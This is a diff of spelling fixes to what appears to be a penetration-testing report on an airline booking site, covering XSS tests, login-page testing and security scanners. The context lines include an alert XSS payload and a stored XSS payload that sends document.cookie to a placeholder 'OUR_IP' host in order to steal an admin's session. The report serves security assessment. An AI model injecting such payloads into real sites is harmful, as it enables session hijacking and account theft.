@@ -472,7 +472,7 @@ Payload: `<script>alert(window.origin)</script>,2,3`
 
 ![](./attachments/Pasted%20image%2020220514155639.png)
 
-This is just a reflected XSS, but if we can somehow store a malicious payload in the the `bookings` database we might be able to steal a session cookie from an employee at the airline. When he opens the booking table in the backend admin portal, the injected code will be executed and his browser cookie will be sent to us.
+This is just a reflected XSS, but if we can somehow store a malicious payload in the `bookings` database, we might be able to steal a session cookie from an employee at the airline. When he opens the booking table in the backend admin portal, the injected code will be executed and his browser cookie will be sent to us.
 
 This can be done by injecting a payload into the booking request.
 
@@ -480,7 +480,7 @@ Payload: `311<script>new Image().src='http://OUR_IP/index.php?c='+document.cooki
 
 ![](./attachments/Pasted%20image%2020220515151948.png)
 
-Sadly we get an error, the database does nok accept the input.
+Sadly we get an error, the database does not accept the input.
 
 ---
 ## Pen-testing login page:
@@ -561,7 +561,7 @@ There are a lot of vulnerabilities here. We assume this is because Apache/PHP/Do
 ## Embold scanner:
 Scans the `desktop-app` Java files, opposite to the other scanners. 
 
-There are many dublicates in the output.
+There are many duplicates in the output.
 
 ![](./attachments/Pasted%20image%2020220515155923.png)
 
